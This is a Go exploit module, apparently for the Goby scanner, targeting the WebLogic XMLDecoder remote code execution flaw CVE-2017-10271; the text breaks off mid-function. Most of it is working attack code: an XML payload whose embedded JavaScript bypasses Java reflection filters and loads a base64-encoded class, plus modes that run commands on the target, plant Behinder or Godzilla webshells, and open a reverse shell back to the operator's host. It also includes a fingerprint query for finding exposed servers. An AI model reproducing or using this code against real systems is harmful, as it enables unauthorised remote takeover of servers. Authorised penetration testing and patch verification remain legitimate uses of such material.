package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "WebLogic CoordinatorPortType Remote Code Execution Vulnerability (CVE-2017-10271)",
    "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>Due to the default activation of the WLS WebService component during the deployment process, WebLogic utilizes XMLDecoder to parse serialized data. Attackers can exploit this by constructing malicious XML files to achieve remote command execution, potentially allowing them to execute arbitrary code on the server and gain control over the entire web server.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html",
    "DisclosureDate": "2017-10-19",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "2",
    "Is0day": false,
    "CNNVD": [
        "CNNVD-201710-829"
    ],
    "CNVD": [
        "CNVD-2017-31499"
    ],
    "VulType": [
        "Code Execution"
    ],
    "Impact": "<p>Since WebLogic enables the WLS WebService component by default during the deployment process, this component uses XMLDecoder to parse the serialized data. An attacker can implement remote command execution by constructing a malicious XML file, which may cause the attacker to execute arbitrary code on the server side. And then control the entire web server.</p>",
    "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. Users are advised to install the patch to address the vulnerability. You can obtain the patch from the following link: <a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\">https://www.oracle.com/security-alerts/cpuoct2017.html</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-10271"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2017-10271"
    ],
    "CVSSScore": "7.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": [
            "weblogic"
        ],
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "Translation": {
        "CN": {
            "Name": "WebLogic CoordinatorPortType 远程代码执行漏洞（CVE-2017-10271）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server 是其中的一个适用于云环境和传统环境的应用服务器组件。<br></p><p>WebLogic 在部署过程中默认启用了 WLS WebService 组件，此组件使用了 XMLDecoder 来解析序列化数据，攻击者可以通过构造恶意的XML文件来实现远程命令执行，可能导致攻击者在服务器端任意执行代码，进而控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，请用户安装补丁以修复漏洞，补丁获取链接：<a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpuoct2017.html</a><br></p>",
            "Impact": "<p>WebLogic 在部署过程中默认启用了 WLS WebService 组件，此组件使用了 XMLDecoder 来解析序列化数据，攻击者可以通过构造恶意的XML文件来实现远程命令执行，可能导致攻击者在服务器端任意执行代码，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WebLogic CoordinatorPortType Remote Code Execution Vulnerability (CVE-2017-10271)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>Due to the default activation of the WLS WebService component during the deployment process, WebLogic utilizes XMLDecoder to parse serialized data. Attackers can exploit this by constructing malicious XML files to achieve remote command execution, potentially allowing them to execute arbitrary code on the server and gain control over the entire web server.</p>",
            "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. Users are advised to install the patch to address the vulnerability. You can obtain the patch from the following link:&nbsp;<a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpuoct2017.html</a><br></p>",
            "Impact": "<p>Since WebLogic enables the WLS WebService component by default during the deployment process, this component uses XMLDecoder to parse the serialized data. An attacker can implement remote command execution by constructing a malicious XML file, which may cause the attacker to execute arbitrary code on the server side. And then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "PostTime": "2023-10-27",
    "PocId": "10795"
}`

	sendPayloadFlagYCeduL := func(u *httpclient.FixUrl, command string) (*httpclient.HttpResponse, error) {
		// A5 Code
		code := `yv66vgAAADEBeQoAEQChCgAzAKIHAKMKAAMApAkAhQClCgARAKYKAA8ApwgAqAoAFACpCACqCgAPAKsKAKwArQoArACuCACvBwCwCgAPALEHALIKALMAtAgAtQcAtggAtwgAuAoAFAC5CgAUALoIALsIALwKAIUAvQcAvgoAHAC/CADACADBCACXCgAcAMIIAMMIAMQHAMUHAMYKABQAxwoAJQDICADJCADKCgAUAMsKAIUAzAgAzQoAFADOCADPCQCFANAKANEA0goA0QDTCQCFANQHANUKADMA1goAMwDXCACaCADYCADZCgCFANoIANsKAIUA3AgA3QoAhQDeCgAUAN8IAOAKAA8A4QgA4ggA4wcA5AoAQwDlCgBDAOYHAOcKAEYA6AoAhQDpCgBGAOoKAEYA6woARgDsCgAcAO0IAO4KAO8A8AoAFADxCADyCgAUAPMIAPQIAPUHAPYKAFQAoQoAVAD3CAD4CgBUAO0IAPkIAPoIAPsIAPwIAP0KAP4A/woA/gEABwEBCgECAQMKAGABBAgBBQoAYAEGCgBgAQcKAGABCAoBAgEJCgECAQoIAQsIAQwKAP4BDQcBDgoAbAEPCgBsAQMKAQIBEAoAbAEQCgBsAREKACQBEgoAJAETCgEUARUKARQA6wUAAAAAAAAAMgoAMwEWCgECARcKAGwA7AoA0QEYCgCFARkIARoIARsKAA8BHAcBHQgBHggBHwgAnQgBIAcBIQcBIgEAAmlwAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEcG9ydAEAE0xqYXZhL2xhbmcvSW50ZWdlcjsBAA5zZXJ2bGV0UmVxdWVzdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxwcm94eUNvbW1hbmQBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAApjbGVhclBhcmFtAQAHd2xzUGF0aAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAFd3JpdGUBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBAAdyZXZlcnNlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAA3J1bgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQAHQTUuamF2YQwAjQCODAEjASQBABt3ZWJsb2dpYy93b3JrL0V4ZWN1dGVUaHJlYWQMASUBJgwAiwCMDAEnASgMASkAlgEAElNlcnZsZXRSZXF1ZXN0SW1wbAwBKgErAQARY29ubmVjdGlvbkhhbmRsZXIMASwBLQcBLgwBLwEwDAExATIBABFnZXRTZXJ2bGV0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwBMwE0AQAQamF2YS9sYW5nL09iamVjdAcBNQwBNgE3AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NvbW1hbmQBAAAMATgBOQwBOgCWAQAMZ2V0UGFyYW1ldGVyAQAGd2hvYW1pDACRAJIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAE7AJYBAAtnZXRSZXNwb25zZQEACWdldFdyaXRlcgwBPACOAQAWZ2V0U2VydmxldE91dHB1dFN0cmVhbQEAC3dyaXRlU3RyZWFtAQATamF2YS9pby9JbnB1dFN0cmVhbQEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0MAT0BPgwAjQE/AQAQY29tbWFuZCBub3QgbnVsbAEABSMjIyMjDAFAASsMAJQAkgEAAToMAUEBQgEAImNvbW1hbmQgcmV2ZXJzZSBob3N0IGZvcm1hdCBlcnJvciEMAIcAiAcBQwwBRAFFDAFGAUcMAIkAigEAEGphdmEvbGFuZy9UaHJlYWQMAI0BSAwBSQCOAQAFJCQkJCQBABJmaWxlIGZvcm1hdCBlcnJvciEMAJcAmAEABUBAQEBADACZAJIBAAQkTk8kDACVAJYMAUoBSwEALndlYmxvZ2ljLnNlcnZsZXQuaW50ZXJuYWwuV2ViQXBwU2VydmxldENvbnRleHQMAUwBTQEADmdldFJvb3RUZW1wRGlyAQAKZ2V0Q29udGV4dAEADGphdmEvaW8vRmlsZQwBTgCWDACNAU8BABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAI0BUAwAnQCeDACXAT8MAVEAjgwBUgCODAFTAJYBAAdvcy5uYW1lBwFUDAFVAJIMAVYAlgEAA3dpbgwBVwFYAQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAVkBWgEABSAtbiA0AQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAVsMAVwBXQwAmQFeAQARamF2YS91dGlsL1NjYW5uZXIHAV8MAWABYQwAjQFiAQACXGEMAWMBZAwBZQFmDAFnAJYMAWgBYQwBaQCOAQAHL2Jpbi9zaAEAB2NtZC5leGUMAJkBagEAD2phdmEvbmV0L1NvY2tldAwAjQCbDAFrAWwMAW0BZgwBbgFvDAFwAW8HAXEMAJcBcgwBcwF0DAF1AW8MAXYBbwwAmgCbAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBdwF4AQACW0IBABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgEAJm9yZy5hcGFjaGUuY29tbW9ucy5jb2RlYy5iaW5hcnkuQmFzZTY0AQACQTUBABJqYXZhL2xhbmcvUnVubmFibGUBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRDdXJyZW50V29yawEAHSgpTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0TmFtZQEACGVuZHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAKZ2V0TWVzc2FnZQEAD3ByaW50U3RhY2tUcmFjZQEACGdldEJ5dGVzAQAEKClbQgEABShbQilWAQAKc3RhcnRzV2l0aAEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAXKExqYXZhL2xhbmcvUnVubmFibGU7KVYBAAVzdGFydAEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAPZ2V0QWJzb2x1dGVQYXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARKExqYXZhL2lvL0ZpbGU7KVYBAAVmbHVzaAEABWNsb3NlAQAIdG9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGph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`
		payload := `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="javax.script.ScriptEngineManager" method="newInstance" id="sm">
                    <void method="getEngineByName" id="engine">
                        <string>js</string>
                        <void method="eval" id="echo">
                            <string>
<![CDATA[
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField('theUnsafe');
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  } catch (error) {
    reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(bytes){
  var clz = null;
  var version = java.lang.System.getProperty("java.version");
  var unsafe = getUnsafe()
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  try{
    if (version.split(".")[0] >= 11) {
      bypassReflectionFilter();
    defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
    setAccessible(defineClassMethod);
    // 绕过 setAccessible 
    clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz;
  }
}
function base64DecodeToByte(str) {
  var bt;
  try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
  } catch (e) {
    bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
  }
  return bt;
}
var code="` + code + `";
clz = defineClass(base64DecodeToByte(code));
clz.newInstance();
]]>
</string>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body />
</soapenv:Envelope>`
		uris := []string{
			`/wls-wsat/CoordinatorPortType`,
			`/wls-wsat/RegistrationPortTypeRPC`,
			`/wls-wsat/ParticipantPortType`,
			`/wls-wsat/RegistrationRequesterPortType`,
			`/wls-wsat/CoordinatorPortType11`,
			`/wls-wsat/RegistrationPortTypeRPC11`,
			`/wls-wsat/ParticipantPortType11`,
			`/wls-wsat/RegistrationRequesterPortType11`,
		}
		for _, uri := range uris {
			requestConfig := httpclient.NewPostRequestConfig(uri)
			requestConfig.Data = payload
			requestConfig.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			requestConfig.Header.Store("command", command)
			rsp, err := httpclient.DoHttpRequest(u, requestConfig)
			if rsp != nil && rsp.StatusCode != 404 {
				return rsp, err
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	checkFileFlagYCeduL := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayloadFlagYCeduL(u, "echo a61b225af2ba8df4e45e373ae0309b7b")
			return rsp != nil && strings.Contains(rsp.Utf8Html, "a61b225af2ba8df4e45e373ae0309b7b")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := strings.TrimSpace(goutils.B2S(ss.Params["cmd"]))
				rsp, _ := sendPayloadFlagYCeduL(expResult.HostInfo, cmd)
				if rsp != nil {
					expResult.Output = rsp.Utf8Html
					expResult.Success = true
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				sendPayloadFlagYCeduL(expResult.HostInfo, fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp))
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
